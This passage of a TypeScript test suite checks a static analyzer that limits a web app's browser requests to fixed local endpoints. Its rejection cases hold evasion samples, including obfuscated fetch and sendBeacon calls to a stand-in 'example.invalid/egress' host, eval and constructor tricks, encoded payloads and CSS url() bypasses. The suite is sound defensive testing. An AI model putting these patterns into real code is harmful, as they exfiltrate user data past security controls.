    if (tag.names.some((name) => ["src", "srcSet", "href", "xlinkHref", "poster", "srcDoc", "formAction", "action", "data", "form", "style", "httpEquiv"].includes(name))) violations.push("disallowed browser egress: resource JSX prop");
    if (tag.name === "button" || tag.name === "input") {
      const types = tag.node.attributes.filter((attribute) => attribute.type === "JSXAttribute" && attribute.name.type === "JSXIdentifier" && attribute.name.name === "type");
      const type = types.length === 1 && types[0].type === "JSXAttribute" && types[0].value?.type === "Literal" ? types[0].value.value : undefined;
      if (type !== (tag.name === "button" ? "button" : "search")) violations.push("unregistered input or submission type");
    }
    for (const attribute of tag.node.attributes) {
      if (attribute.type === "JSXAttribute" && attribute.name.type === "JSXIdentifier" && attribute.name.name === "type" && attribute.value?.type === "Literal" && ["submit", "image", "file"].includes(String(attribute.value.value))) violations.push("unregistered input or submission type");
    }
    // Preserve only the existing literal icon props, with no other reference that could mutate or shadow them.
    const spreads = fixedIconProps && /^(?:path|rect|circle)$/.test(tag.name)
      ? tag.spreads.filter((spread) => spread !== "{...common}") : tag.spreads;
    if (spreads.length) {
      violations.push("disallowed browser egress: uninspected JSX spread");
    }
  }
  return { targets: directCalls.map((call) => call.target), violations };
}

describe("browser-source boundary", () => {
  const productionSources = Object.entries(productSources).filter(([path]) => isProductionSourcePath(path));
  const sourceText = productionSources.filter(([path]) => scriptFileSuffix.test(path)).map(([, content]) => content).join("\n");

  it.each([
    'const Tag = "form"; <Tag />;',
    'const ActivityTimeline = "form"; <ActivityTimeline onSubmit={handler} />;',
    'import { ActivityTimeline } from "./features/timeline/ActivityTimeline"; function Panel(ActivityTimeline) { return <ActivityTimeline />; }',
    'function Tag() { return null; } Tag = "form"; <Tag />;',
    'const Tag = unknownTag; <Tag />;',
    '<components.Tag />;',
  ])("rejects unverified or shadowed JSX bindings: %s", (source) => {
    expect(inspectNetworkSource("./App.tsx", source).violations).toContain("unverified JSX component binding");
  });

  it("verifies imported components against scanned function exports", () => {
    const source = 'import { Tag } from "./tag"; <Tag />;';
    expect(inspectNetworkSource("./Component.tsx", source, { "./tag.tsx": 'export const Tag = "form";' }).violations).toContain("unverified JSX component binding");
    expect(inspectNetworkSource("./Component.tsx", source, { "./tag.tsx": "export function Tag() { return null; }" }).violations).toEqual([]);
    expect(inspectNetworkSource("./Component.tsx", source, { "./tag.tsx": 'export function Tag() { return null; } Tag = "form" as unknown as typeof Tag;' }).violations).toContain("unverified JSX component binding");
  });

  it("binds data and registry exceptions to the complete reviewed source", () => {
    for (const [path] of Object.entries(reviewedDynamicSources)) expect(matchesReviewedDynamicSource(path, productSources[path]), path).toBe(true);
    const alias = 'const expected = async () => {}; const index = String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114); const build = expected[index]; build("return 1")();';
    expect(inspectNetworkSource(transportPath, alias).violations).toContain("unregistered computed property");
    expect(inspectNetworkSource(transportPath, productSources[transportPath] + alias).violations).toContain("unregistered computed property");
    const renderer = 'import { registeredCardRenderer } from "./card-registry"; const Renderer = registeredCardRenderer(card); <Renderer onSubmit={handler} />;';
    const sources = { "./features/cards/card-registry.tsx": 'export function registeredCardRenderer() { return "form" as unknown as ComponentType; }' };
    expect(inspectNetworkSource("./features/cards/StructuredCard.tsx", renderer, sources).violations).toContain("unverified JSX component binding");
  });

  it.each(["./missing", "./payload.json", "./hidden.test.ts", "./test/setup.ts", "./styles.css?inline"])("rejects imports not covered by the production scan: %s", (specifier) => {
    expect(inspectNetworkSource("./Component.tsx", 'im' + 'port "' + specifier + '";').violations).toContain("import outside scanned production source");
  });

  it("resolves a hidden module only when the scan contains it", () => {
    const sources = { "./.hidden/runtime.ts": "export const value = 1;" };
    expect(resolveScannedImport("./Component.tsx", "./.hidden/runtime", sources)).toBe("./.hidden/runtime.ts");
    expect(resolveScannedImport("./Component.tsx", "./.hidden/runtime", {})).toBeUndefined();
  });

  it.each([
    'ref.current[`inner${"HTML"}`] = markup;',
    'ref.current[("innerHTML" as const)] = markup;',
    'const key = "innerHTML"; const values = [ref.current[key]];',
    'const key = "innerHTML"; const values = { value: ref.current[key] };',
    'ref.current.setAttributeNode(attribute);',
    'ref.current.attributes.setNamedItem(attribute);',
    'range.insertNode(element);',
    'ref.current.before(element);',
    'external.invoke(payload);',
    '__TAURI_INTERNALS__.invoke(payload);',
    'console.log(payload);',
    'reportError(payload);',
    'WebAssembly.instantiate(bytes, imports);',
    'cookieStore.set({name: "x", value: "y"});',
    'caches.match("/sensitive");',
    'showOpenFilePicker();',
    'showSaveFilePicker();',
    'showDirectoryPicker();',
    'CSS.paintWorklet.addModule("/api/mvp/other");',
    'AudioContext.prototype.audioWorklet;',
    'Notification.requestPermission();',
    'window.addEventListener("message", event => event.source?.postMessage(payload));',
    '<div nativeEvent={event.nativeEvent} />;',
    '<form><button>Send</button></form>;',
    '<script async />;',
    '<input type="image" />;',
    '<input type="file" />;',
    '<button>Send</button>;',
    '<button type={kind} />;',
    '<input type={kind} />;',
    'const platformCrypto = crypto; platformCrypto.getRandomValues(new Uint8Array(1));',
    'performance.now();',
    'Date.parse(value);',
    'function Demo() { return <button type="button" onClick={event => event.currentTarget.getRootNode().write(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,62))} />; }',
    'ref.current.getRootNode().writeln(markup);',
    'ref.current.getRootNode().execCommand("insertHTML", false, markup);',
    'ref.current.createNodeIterator(root).nextNode();',
    'function Demo() { return <button type="button" onClick={event => { let node: Node = event.currentTarget; while (node.parentNode) node = node.parentNode; const view = (node as any)["default" + "View"]; view.setInterval(String.fromCharCode(97,108,101,114,116,40,49,41), 0); }} />; }',
    'const fn = async () => {}; const key = String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114); const { [key]: build } = fn; build("return 1")();',
    'const node = document.getElementById("root"); node?.animate([{ backgroundImage: String.fromCharCode(117,114,108,40,47,111,117,116,115,105,100,101,41) }], { duration: 1 });',
    'document.querySelectorAll(String.fromCharCode(115,116,121,108,101))[0]?.sheet?.insertRule(String.fromCharCode(1,2,3));',
    'ref.current.attributeStyleMap.set(name, value);',
    'throw new Error(privateValue);',
    'Promise.reject(privateValue);',
    'localStorage.setItem("data", value);',
    'sessionStorage.setItem("data", value);',
    'alert(value);',
    'prompt(value);',
    'const link = document.querySelectorAll(String.fromCharCode(108,105,110,107))[0]; const attribute = link?.getAttributeNode(String.fromCharCode(104,114,101,102)); if (attribute) attribute.value = String.fromCharCode(47,97,116,116,114,45,108,105,110,107);',
    'ref.current.attributes.getNamedItem(key).value = target;',
    'ref.current.textContent = css;',
    'ref.current.firstChild.nodeValue = css;',
    'const schedule = setInterval; schedule(String.fromCharCode(97,108,101,114,116,40,49,41), 0);',
    '<div src /* hidden attribute */ = {target} />;',
    '<div {... /* hidden spread */ props} />;',
    'import.meta.env.DEVIL;',
  ])("rejects syntax-aware alternate egress paths: %s", (source) => {
    expect(inspectNetworkSource("./App.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("includes an embedded test token helper in production scans", () => {
    const path = "./capabilities/tickets/ticket.test.helpers.ts";
    expect(isProductionSourcePath(path)).toBe(true);
    expect(inspectNetworkSource(path, 'fetch("/api/mvp/commands", {});').violations).toContain("disallowed fetch target: /api/mvp/commands");
  });

  it.each([
    "./App.test.tsx",
    "./features/card-runtime.test.ts",
    "./features/card-runtime.test.tsx",
    "./features/card-runtime.spec.ts",
    "./features/card-runtime.spec.tsx",
    "./test/setup.ts",
    ".\\App.test.tsx",
    ".\\features\\card-runtime.spec.ts",
    ".\\test\\setup.ts",
  ])("excludes only an actual test or explicit setup: %s", (path) => {
    expect(isProductionSourcePath(path)).toBe(false);
  });

  it.each([
    "./capabilities/tickets/ticket.test.helpers.ts",
    "./features/card.spec.adapter.ts",
    "./features/card.test-helper.ts",
    "./features/card.testing.ts",
    "./test/setup.helpers.ts",
    "./test/runtime.ts",
    ".\\capabilities\\tickets\\ticket.test.helpers.ts",
    "./tests/runtime.ts",
    "./spec/runtime.ts",
    "./__tests__/runtime.ts",
    "./features.test.ts/runtime.ts",
    "./features.spec.ts/runtime.ts",
    "./features/card.Test.ts",
    "./features/card.SPEC.ts",
    "./features/card.test.TSX",
    "./features/cardxtest.ts",
    "./features/test/setup.ts",
  ])("includes a production-importable module: %s", (path) => {
    expect(isProductionSourcePath(path)).toBe(true);
  });

  it("retains embedded test-token content for both per-file and aggregate production scans", () => {
    const helperPath = "./capabilities/tickets/ticket.test.helpers.ts";
    const helperSource = 'fetch("/api/mvp/commands", {}); localStorage; /* node:fs marker */';
    const entries = [
      [helperPath, helperSource],
      ["./capabilities/tickets/ticket.test.ts", "excluded-test-sentinel"],
      ["./test/setup.ts", "excluded-setup-sentinel"],
    ];
    const selected = entries.filter(([path]) => isProductionSourcePath(path));
    expect(selected).toEqual([[helperPath, helperSource]]);
    for (const [path, content] of selected) {
      expect(inspectNetworkSource(path, content).violations).toContain("disallowed fetch target: /api/mvp/commands");
    }
    const selectedText = selected.map(([, content]) => content).join("\n");
    for (const marker of ["fetch", "localStorage", "node:fs"]) expect(selectedText).toContain(marker);
  });

  it("confines browser requests to the exact app-local transport targets", () => {
    for (const [path, content] of productionSources) {
      const violations = path.endsWith(".css") ? inspectStylesheetSource(content)
        : path.endsWith(".html") ? inspectHtmlSource(path, content) : inspectNetworkSource(path, content).violations;
      expect(violations, path).toEqual([]);
    }
    expect(inspectNetworkSource(transportPath, productSources[transportPath]).targets).toEqual(allowedFetchTargets);
  });

  it("keeps App, Ticket capabilities and generic features free from fetch", () => {
    for (const [path, content] of productionSources.filter(([path]) => path === "./App.tsx" || path.startsWith("./capabilities/tickets/") || path.startsWith("./features/"))) {
      expect(content, path).not.toMatch(/\bfetch\b/);
    }
  });

  it("includes the imported production stylesheets", () => {
    expect(productionSources.map(([path]) => path)).toEqual(expect.arrayContaining([
      "./styles.css",
      "./capabilities/tickets/ticket.css",
    ]));
    for (const [path, content] of productionSources.filter(([path]) => path.endsWith(".css"))) {
      expect(content.length, path).toBeGreaterThan(0);
    }
  });

  it.each([
    'body { background: url("/api/mvp/other"); }',
    '@import "/api/mvp/other";',
    '@import url("/api/mvp/other");',
    'body { background: image-set("/api/mvp/other" 1x); }',
    'body { background: -webkit-image-set("/api/mvp/other" 1x); }',
    'body { background: u\\72l("/api/mvp/other"); }',
    'body { background: \\75 rl("/api/mvp/other"); }',
    '@\\69mport "/api/mvp/other";',
    '@import/**/"/api/mvp/other";',
    'body { background: src("/api/mvp/other"); }',
  ])("rejects stylesheet egress: %s", (source) => {
    expect(inspectStylesheetSource(source)).toEqual(["disallowed stylesheet resource"]);
  });

  it("retains ordinary CSS with local gradients and variables", () => {
    expect(inspectStylesheetSource(".card { color: var(--text); background: linear-gradient(red, blue); }")).toEqual([]);
  });

  it.each([
    `<style>{'@import "/api/mvp/other";'}</style>`,
    `<div style={{ backgroundImage: 'image-set("/api/mvp/other" 1x)' }} />`,
    `<div style={{ backgroundImage: '-webkit-image-set("/api/mvp/other" 1x)' }} />`,
    `<div style={{ backgroundImage: 'src("/api/mvp/other")' }} />`,
    `<style>{'@im' + 'port "/api/mvp/other";'}</style>`,
    `<div style={{ backgroundImage: 'image-' + 'set("/api/mvp/other" 1x)' }} />`,
    'const image = "u" /* split */ + "rl(/api/mvp/other)"; <div style={{ backgroundImage: image }} />;',
    'const image = "u" + /* split */ "rl(/api/mvp/other)"; <div style={{ backgroundImage: image }} />;',
    'const image = "u" // split\n + "rl(/api/mvp/other)"; <div style={{ backgroundImage: image }} />;',
    'const image = "image-" + // split\n "set(/api/mvp/other 1x)"; <div style={{ backgroundImage: image }} />;',
    'const image = ("u") + ("rl(/api/mvp/other)"); <div style={{ backgroundImage: image }} />;',
    '<div style={unknownStyle} />;',
    'const props = { style: unknownStyle }; <div {...props} />;',
    'const props = { ["st" /* split */ + "yle"]: { backgroundImage: ("u") + ("rl(/api/mvp/other)") } }; <div {...props} />;',
    String.raw`<style>{'@\\69mport "/api/mvp/other";'}</style>`,
    'open("/api/mvp/other");',
    'const navigate = open; navigate("/api/mvp/other");',
    '(0, open)("/api/mvp/other");',
    'open.call(null, "/api/mvp/other");',
    'const navigate = open.bind(null); navigate("/api/mvp/other");',
  ])("rejects inline styles and unqualified navigation: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("keeps presentation in scanned stylesheets", () => {
    expect(inspectNetworkSource("./Component.tsx", 'import "./styles.css"; <div className="card" />;').violations).toEqual([]);
  });

  it.each([
    'const Tag = "form"; <Tag ref={ref} />; Object.assign(ref.current, { action: "/api/mvp/other" }); ref.current.submit.call(ref.current);',
    'const send = ref.current.submit; send.call(ref.current);',
    'ref.current.submit.bind(ref.current)();',
    'ref.current["sub" /* split */ + "mit"].call(ref.current);',
    'const send = ref.current.requestSubmit; send.call(ref.current);',
    'ref.current["requestSubmit"]();',
  ])("rejects indirect native form submission: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: indirect form submission");
  });

  it("retains the synthetic submit action value", () => {
    expect(inspectNetworkSource("./Command.ts", 'const command = { action: "submit" };').violations).toEqual([]);
  });

  it("retains only the existing synthetic hook submit callback binding", () => {
    const source = `import { SyntheticTicketExperience } from "./capabilities/tickets/SyntheticTicketExperience"; const ticketRuntime = useSyntheticTicketRuntime(initialTicket, scenario, runtime.selectedThreadId ?? "no-thread"); ${approvedSyntheticSubmitProps} />`;
    expect(inspectNetworkSource("./App.tsx", source).violations).toEqual([]);
    expect(inspectNetworkSource("./Other.tsx", source).violations.length).toBeGreaterThan(0);
    expect(inspectNetworkSource("./App.tsx", source + " ticketRuntime.submit.call(ticketRuntime);").violations.length).toBeGreaterThan(0);
    expect(inspectNetworkSource("./App.tsx", source.replace("<SyntheticTicketExperience", "<Tag")).violations).toContain("disallowed browser egress: indirect form submission");
    expect(inspectNetworkSource("./App.tsx", source.replace("<SyntheticTicketExperience", "<form")).violations).toContain("disallowed browser egress: indirect form submission");
  });

  it.each(["Tag", "form", "div"])("rejects a submit callback on unregistered %s", (tag) => {
    const source = `const ticketRuntime = useSyntheticTicketRuntime(initialTicket, scenario, runtime.selectedThreadId ?? "no-thread"); const { submit: handler } = ticketRuntime; const Tag = "form"; <${tag} onSubmit={handler} />`;
    expect(inspectNetworkSource("./App.tsx", source).violations).toContain("disallowed browser egress: unregistered submit callback");
  });

  it("keeps nested JSX attributes separate from later sibling callbacks", () => {
    const source = 'function SpaceList() { return null; } function Glyph() { return null; } function ActivityTimeline() { return null; } <><SpaceList renderIcon={() => <Glyph />} /><ActivityTimeline onSubmit={handler} /></>';
    expect(inspectNetworkSource("./App.tsx", source).violations).toEqual([]);
    expect(inspectNetworkSource("./App.tsx", source.replace("<ActivityTimeline", "<Tag")).violations).toContain("disallowed browser egress: unregistered submit callback");
  });

  it.each([
    'const view = <div title={index < limit ? "before" : "after"} />;',
    'type Handler = (value: ReturnType<typeof factory>) => void; const view = <div />;',
    'const view = <div render={() => <span>nested text</span>} />;',
  ])("parses JSX independently of TypeScript and expression syntax: %s", (source) => {
    expect(inspectNetworkSource("./Component.tsx", source).violations).toEqual([]);
  });

  it.each([
    'const modules = import.meta.glob("./*.test.js", { eager: true });',
    'const meta = import.meta; meta.glob(pattern);',
    'const run = require; run("./side-effect.test.js");',
  ])("rejects alternate module-loading mechanisms: %s", (source) => {
    expect(inspectNetworkSource("./Component.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it.each([
    'const mutate = Object.assign; mutate(ref.current, props);',
    'Object["as" + "sign"](ref.current, props);',
    'const root = Object; root.assign(ref.current, props);',
    'const { assign } = Object; assign(ref.current, props);',
  ])("rejects uninspected object mutation aliases: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it.each([
    'Function(source)();',
    'new Function(source)();',
    'const compile = Function; compile(source)();',
    'Function.call(null, source)();',
    'Function.bind(null, source)()();',
    '(0, eval)(source);',
    'const run = eval; run(source);',
    'handler.constructor(source)();',
    'handler["con" /* split */ + "structor"](source)();',
    'AsyncFunction(source)();',
    'GeneratorFunction(source)();',
    'AsyncGeneratorFunction(source)();',
  ])("rejects callable and aliased dynamic code: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: dynamic code");
  });

  it.each([
    'const html = "<im"/*x*/+"g s"/*x*/+"rc=/api/mvp/other>"; ref["inner"/*x*/+"HTML"] = html;',
    'ref[("outer") + ("HTML")] = markup;',
    'ref[(("inner")) /* split */ + (("HTML"))] = markup;',
    'ref["insertAdjacent" // split\n + "HTML"]("beforeend", markup);',
    'ref["set" + /* split */ "Attribute"](name, value);',
    'ref[`outer` /* split */ + `HTML`] = markup;',
  ])("normalizes computed sinks across comments and parentheses: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: uninspected DOM mutation");
  });

  it.each([
    'ref.current.insertAdjacentHTML("beforeend", markup);',
    'ref.current.outerHTML = markup;',
    'const insert = ref.current.insertAdjacentHTML; insert.call(ref.current, "beforeend", markup);',
    'ref.current["outer" + "HTML"] = markup;',
    'ref.current.setHTMLUnsafe(markup);',
    'ref.current.setHTML(markup);',
    'range.createContextualFragment(markup);',
    'const parse = DOMParser; new parse();',
    'ref.current["set" + "Attribute"](name, value);',
    'ref.current.appendChild(element);',
    'ref.current.attachShadow(options);',
  ])("rejects uninspected DOM mutation sinks: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: uninspected DOM mutation");
  });

  it.each([
    'history.pushState({}, "", "/api/mvp/other"); location.reload();',
    'history.replaceState({}, "", "/api/mvp/other"); location.reload();',
    'const route = history; route.pushState({}, "", target);',
    'const current = location; current.reload();',
    'location["re" /* split */ + "load"]();',
    'navigation.navigate("/api/mvp/other");',
    'window.history.back();',
    'history.go(-1);',
    'window.location.search = "?other";',
    'window.location.search /* changed */ = "?other";',
  ])("rejects navigation globals beyond the fixed query read: %s", (source) => {
    expect(inspectNetworkSource("./Navigation.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("retains only the existing read-only query-string access", () => {
    expect(inspectNetworkSource("./App.tsx", 'new URLSearchParams(window.location.search).get("scenario")').violations).toEqual([]);
  });

  it.each(["ts", "tsx", "mts", "cts", "js", "jsx", "mjs", "cjs"])("scans production script extension %s", (extension) => {
    const path = `./features/side-effect.${extension}`;
    const source = 'fetch("/api/mvp/other", {}); localStorage;';
    expect(isProductionSourcePath(path) && scriptFileSuffix.test(path)).toBe(true);
    expect(inspectNetworkSource(path, source).violations.length).toBeGreaterThan(0);
    const aggregate = [[path, source]].filter(([entry]) => isProductionSourcePath(entry) && scriptFileSuffix.test(entry)).map(([, content]) => content).join("\n");
    expect(aggregate).toContain("localStorage");
  });

  it.each([
    'import "../outside.js";',
    'import /* side effect */ "../outside.mjs";',
    'import "./side-effect.test.js";',
    'import "./side-effect.test.js?raw";',
    'import "./test/setup";',
    'import { helper } from // note\n"./helper.test.js";',
    'import // side effect\n"../outside.mjs";',
    'import { helper } from /* block */ // line\n"./helper.spec.ts?raw";',
    'import "./side-effect.spec";',
    'import "/public-script.js";',
  ])("rejects unscanned production imports: %s", (source) => {
    expect(inspectNetworkSource("./App.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it.each([
    'import("./side-effect.test.js");',
    'import/* split */("./side-effect.test.js");',
    'import // split\n("./side-effect.test.js");',
    'import /* block */ // line\n ("./side-effect.test.js");',
    String.raw`im\u0070ort/* split */("./side-effect.test.js");`,
  ])("rejects dynamic imports with trivia: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("dynamic browser import");
  });

  it.each(["preload", "preloadModule", "preinit", "preinitModule", "preconnect", "prefetchDNS"])("rejects React DOM resource API %s including aliases", (name) => {
    for (const source of [
      `${name}("/api/mvp/other", { as: "image" });`,
      `import { ${name} as request } from "react-dom"; request("/api/mvp/other", { as: "image" });`,
    ]) expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: resource hint");
  });

  it.each([
    'import * as ReactDOM from "react-dom"; const hint = ReactDOM["pre" /* split */ + "load"]; hint(target);',
    'import React from "react"; React["create" /* split */ + "Element"](tag, props);',
    'import /* comment */ * as React from "react";',
    'import React /* comment */ from "react";',
    'import * as helper from "./helper";',
    'import helper from "./helper";',
    'import { request } f' + 'rom "unregistered-module";',
  ])("requires inspected named production imports: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it.each([
    'import { default as React } from "react"; const render = React["create" /* split */ + "Element"]; render(tag, props);',
    'import { "default" as React } from "react";',
    'import { default /* alias */ as React } from "react";',
    'export * as R from "react";',
    'export /* bridge */ * as R from "react";',
    'export { default as R } from "react";',
  ])("rejects namespace bridges through named syntax: %s", (source) => {
    expect(inspectNetworkSource("./bridge.ts", source).violations).toContain("uninspected namespace or default import");
  });

  it.each([
    'createPortal(<meta httpEquiv="refresh" content="0;url=/api/mvp/other" />, document.querySelectorAll("head")[0]);',
    '<meta httpEquiv="refresh" content="0;url=/api/mvp/other" />;',
    'const Tag = "meta"; <Tag httpEquiv="refresh" content={target} />;',
    'const props = { httpEquiv: "refresh", content: target };',
    'import { createPortal as render } from "react-dom"; render(element, root);',
  ])("rejects JSX metadata navigation: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("scans the actual HTML entry with only its fixed module script", () => {
    expect(productSources["../index.html"]).toContain(moduleEntry);
    expect(inspectHtmlSource("../index.html", productSources["../index.html"])).toEqual([]);
  });

  it.each([
    `<!-- ${moduleEntry} -->`,
    `<title>${moduleEntry}</title>`,
    `<textarea>${moduleEntry}</textarea>`,
    `<template>${moduleEntry}</template>`,
    `<style>${moduleEntry}</style>`,
    `<noscript>${moduleEntry}</noscript>`,
  ])("rejects an inert module entry: %s", (source) => {
    expect(inspectHtmlSource("../index.html", source).length).toBeGreaterThan(0);
  });

  it.each([
    '<link href="/api/mvp/other">',
    '<img src="/api/mvp/other">',
    '<meta http-equiv="refresh" content="0; url=/api/mvp/other">',
    '<script>alert(1)</script>',
    '<body onload="open(target)">',
    moduleEntry,
  ])("rejects added HTML resource/execution: %s", (extra) => {
    expect(inspectHtmlSource("../index.html", moduleEntry + extra).length).toBeGreaterThan(0);
  });

  it("rejects a changed or relocated module entry", () => {
    expect(inspectHtmlSource("../index.html", moduleEntry.replace("main.tsx", "other.tsx")).length).toBeGreaterThan(0);
    expect(inspectHtmlSource("./other.html", moduleEntry).length).toBeGreaterThan(0);
  });

  it.each(["background", "manifest", "style", "onload"])("rejects a resource-bearing HTML attribute: %s", (attribute) => {
    const source = productSources["../index.html"].replace("<body>", `<body ${attribute}="/api/mvp/other">`);
    expect(inspectHtmlSource("../index.html", source)).toContain("unregistered HTML attribute");
  });

  it.each([
    '<Tag flag={/* } */ true} {...props} />',
    '<Tag flag={// }\n true} {...props} />',
    '<Tag flag={/}>/.test(value)} {...props} />',
    '<Tag flag={/[}/]/.test(value)} {...props} />',
    '<Tag flag={/"/.test(value)} {...props} />',
    '<Tag flag={value / 2} {...props} />',
  ])("retains spreads after expression comments and regex: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: uninspected JSX spread");
  });

  it("allows only the existing immutable icon spread", () => {
    const source = `${approvedIconProps} <path {...common} d="M0 0" />;`;
    expect(inspectNetworkSource("./App.tsx", source).violations).toEqual([]);
    for (const candidate of [
      source.replace("<path", "<div"),
      `${source} common.stroke = value;`,
      `${source} mutate(common);`,
      `${source} function nested(common: unknown) { return <path {...common} />; }`,
      source.replace("strokeWidth: 1.8", "strokeWidth: dynamicValue"),
    ]) expect(inspectNetworkSource("./App.tsx", candidate).violations.length).toBeGreaterThan(0);
    expect(inspectNetworkSource("./Other.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it.each(allowedFetchTargets)("admits the fixed relative literal transport target %s", (target) => {
    expect(inspectNetworkSource(transportPath, `fetch("${target}", {});`).violations).toEqual([]);
  });

  it.each([
    ["direct Ticket fetch", "./capabilities/tickets/ticket-runtime.ts", 'fetch("/api/mvp/commands", {});'],
    ["direct App fetch", "./App.tsx", 'fetch("/api/mvp/commands", {});'],
    ["feature fetch", "./features/cards/card-runtime.ts", 'fetch("/api/mvp/commands", {});'],
    ["absolute URL", transportPath, 'fetch("https://example.invalid/api/mvp/commands", {});'],
    ["protocol-relative URL", transportPath, 'fetch("//example.invalid/api/mvp/commands", {});'],
    ["arbitrary endpoint variable", transportPath, "fetch(endpoint, {});"],
    ["aliased fetch", transportPath, 'const request = fetch; request("/api/mvp/commands", {});'],
    ["indirect fetch helper", transportPath, 'invoke(fetch, "/api/mvp/commands");'],
    ["globalThis.fetch", transportPath, 'globalThis.fetch("/api/mvp/commands", {});'],
    ["window.fetch", transportPath, 'window.fetch("/api/mvp/commands", {});'],
    ["escaped computed fetch", transportPath, 'globalThis["\\x66etch"]("https://example.invalid/egress", {});'],
    ["computed fetch fragments", transportPath, 'globalThis["fe" + "tch"]("https://example.invalid/egress", {});'],
    ["template-literal fetch fragments", transportPath, "globalThis[`fe` + `tch`](`/api/mvp/other`, {});"],
    ["aliased global with computed fetch", transportPath, 'const root = globalThis; const request = root["fe" + "tch"]; request("https" + "://example.invalid/egress");'],
    ["derived global with computed fetch", transportPath, 'const root = document.getElementById("root")?.ownerDocument.defaultView; root?.["fe" + "tch"]("/api/mvp/other");'],
    ["XMLHttpRequest", transportPath, "new XMLHttpRequest();"],
    ["WebSocket", transportPath, 'new WebSocket("/api/mvp/commands");'],
    ["EventSource", transportPath, 'new EventSource("/api/mvp/commands");'],
    ["sendBeacon", transportPath, 'navigator.sendBeacon("https://example.invalid/egress", "demo");'],
    ["WebTransport", transportPath, 'new WebTransport("https:" + "//example.invalid/egress");'],
    ["Audio constructor", transportPath, 'new Audio("https:" + "//example.invalid/egress");'],
    ["Image source", transportPath, 'const pixel = new Image(); pixel.src = "https://example.invalid/egress";'],
    ["resource markup", transportPath, '<img src="https://example.invalid/egress" />;'],
    ["object data", transportPath, '<object data={"https:" + "//example.invalid/egress"} />;'],
    ["embed source", transportPath, '<embed src={"https:" + "//example.invalid/egress"} />;'],
    ["form submission", transportPath, '<form action="https://example.invalid/egress" />;'],
    ["string timer code", transportPath, 'globalThis.setTimeout(\'this["fe" + "tch"]("https:" + "//example.invalid/egress")\', 0);'],
  ])("rejects %s", (_label, path, source) => {
    expect(inspectNetworkSource(path, source).violations.length).toBeGreaterThan(0);
  });

  it("rejects a fourth fetch target", () => {
    const candidate = `${allowedFetchTargets.map((target) => `fetch("${target}", {});`).join("\n")}\nfetch("/api/mvp/other", {});`;
    const result = inspectNetworkSource(transportPath, candidate);
    expect(result.violations.length).toBeGreaterThan(0);
    expect(result.targets).toHaveLength(4);
  });

  it.each(["a", "audio", "embed", "form", "iframe", "image", "img", "link", "object", "script", "source", "track", "use", "video"])("rejects resource props spread onto %s", (tag) => {
    for (const source of [
      `const props = { src: "/api/mvp/other" }; <${tag} {...props} />;`,
      `<${tag}\n  {...{ src: "/api/mvp/other" }} />;`,
      `<${tag} {...props} src="/api/mvp/other" />;`,
      `<${tag} {...props}></${tag}>;`,
    ]) {
      expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: resource-bearing markup");
    }
  });

  it.each([
    "const errors = new WeakSet<object>();",
    "<div className={className} />;",
    "function TicketCard() { return null; } <TicketCard title={title} />;",
  ])("retains non-resource syntax: %s", (source) => {
    expect(inspectNetworkSource("./Component.tsx", source).violations).toEqual([]);
  });

  it.each([
    'React.createElement("img", { src: "/api/mvp/other" });',
    'createElement("img", props);',
    'import { createElement as render } from "react"; render("img", props);',
    'const render = React.createElement; render("img", props);',
    'React["create" + "Element"]("img", props);',
    'React.cloneElement(element, { src: "/api/mvp/other" });',
    'import { jsx as render } from "react/jsx-runtime"; render("img", props);',
    'import { jsxs as render } from "react/jsx-runtime"; render("video", props);',
    'import { jsxDEV as render } from "react/jsx-dev-runtime"; render("img", props);',
  ])("rejects uninspected element factories: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations).toContain("disallowed browser egress: uninspected element factory");
  });

  it.each([
    'const Tag = "img"; <Tag src="/api/mvp/other" />;',
    'const Tag = "img"; <Tag onLoad={() => {}} src={target} />;',
    'const Tag = "img"; const props = { src: "/api/mvp/other" }; <Tag {...props} />;',
    'const Tag = "img"; <Tag {...props} />;',
    'const Tag = "img"; <Tag onLoad={() => {}} {...props} />;',
    'const tags = { Image: "img" }; <tags.Image {...props} />;',
    'const Tag = "a"; <Tag href="/api/mvp/other" />;',
    'const Tag = "form"; <Tag action="/api/mvp/other" />;',
    'const Tag = "form"; <Tag onSubmit={() => {}} action="/api/mvp/other" />;',
    'const Tag = "object"; <Tag data="/api/mvp/other" />;',
    'const Tag = "object"; <Tag title=">" data="/api/mvp/other" />;',
    'const Tag = "form"; <Tag title=">" action="/api/mvp/other" />;',
    'const Tag = "img"; <Tag title=">" {...props} />;',
    'const Tag = "object"; <Tag hidden={count > 0} data="/api/mvp/other" />;',
    'const Tag = "img"; <Tag hidden={count > 0} {...props} />;',
    '<input type="image" src="/api/mvp/other" />;',
    '<button formAction="/api/mvp/other" />;',
    'const props = { "src": target };',
    'const props = { ["src" + "Set"]: target };',
  ])("rejects resource props independent of the JSX tag: %s", (source) => {
    expect(inspectNetworkSource("./Resource.tsx", source).violations.length).toBeGreaterThan(0);
  });

  it("keeps browser code free from persistence, unsafe HTML, and native runtime access", () => {
    expect(sourceText).not.toMatch(/\b(localStorage|sessionStorage|indexedDB|serviceWorker)\b/);
